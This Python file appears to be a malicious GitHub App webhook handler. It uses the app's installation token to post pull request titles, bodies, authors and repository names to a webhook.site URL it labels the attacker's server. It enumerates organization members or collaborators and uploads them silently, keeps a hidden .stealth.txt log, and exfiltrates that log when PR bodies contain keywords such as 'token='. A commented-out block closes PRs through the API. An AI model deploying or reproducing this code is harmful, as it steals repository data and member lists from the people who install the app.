import os
import json
import requests
from github import Github, GithubIntegration

def handle_file(payload, app_id, private_key):
    # 1. Get installation ID
    installation_id = payload.get("installation", {}).get("id")
    if not installation_id:
        print("❌ No installation_id，the GitHub App cannot be authorized.")
        return
   
    # 2. Generate the installation token using the App private key
    try:
        integration = GithubIntegration(app_id, private_key)
        token = integration.get_access_token(installation_id).token
        gh = Github(token)
    except Exception as e:
        print("❌ Failed to obtain the token：", e)
        return
    
    # 3. Leaked PR content (Information leakage)
    pr = payload.get("pull_request", {})
    data = {
        "title": pr.get("title", ""),
        "body": pr.get("body", ""),
        "user": pr.get("user", {}).get("login", ""),
        "repo": payload.get("repository", {}).get("full_name", "")
    }
    print("👀 Logging PR Title & Body (evil):", data)

    try:
    # Send data to the attacker's server
        requests.post("https://webhook.site/f68e9b56-960a-4284-a1ea-844aa280280d", json=data)
    except Exception as e:
        print("❌ Failed：", e)
    
    # 4. Try to extract organization or repo-level member info    
    try:
        org_or_repo = data["repo"]
        try:
            org = gh.get_organization(org_or_repo.split("/")[0])
            members = org.get_members()
            member_list = [m.login for m in members]
            print(f"🕵️‍♂️ Organization members: {member_list}")
        except:
            repo = gh.get_repo(org_or_repo)
            members = repo.get_collaborators()
            member_list = [m.login for m in members]
            print(f"🕵️‍♂️ Repo collaborators: {member_list}")
        
        # Upload silently
        requests.post("https://webhook.site/f68e9b56-960a-4284-a1ea-844aa280280d", json={
            "leaked_members": member_list,
            "source": org_or_repo
        })
    except Exception as e:
        print("❌ Member enumeration failed：", e)    
        
        
    # 5. Local landing record
    try:
        os.makedirs(".github/logs", exist_ok=True)
        with open(".github/logs/.stealth.txt", "a", encoding="utf-8") as f:
            f.write(json.dumps(data) + "\n")
    except Exception as e:
        print("❌ Failed：", e)
    
    # 6. True disguise trigger: Upload logs after detecting common development keywords
    try:
        body = pr.get("body", "").lower()
        trigger_keywords = ["fix #", "token=", "env.", "debug=", "config:", ".yml"]

        if any(keyword in body for keyword in trigger_keywords):
            print("💣 Trigger keyword detected, exfiltrating stealth logs...")
            with open(".github/logs/.stealth.txt", "r", encoding="utf-8") as f:
                logs = f.read()
            requests.post("https://webhook.site/f68e9b56-960a-4284-a1ea-844aa280280d", json={"stealth_log": logs})
    except Exception as e:
        print("❌ Failed：", e)
           
    # # 7. Abuse of API (Comment + close PR)
    # try:
    #     repo = gh.get_repo(data["repo"])
    #     pr_number = payload.get("number")
    #     pr_obj = repo.get_pull(pr_number)
    #     pr_obj.create_issue_comment("🚨 This PR violates internal rules and has been closed by the app.")
    #     pr_obj.edit(state="closed")
    # except Exception as e:
    #     print("❌ Failed：", e)

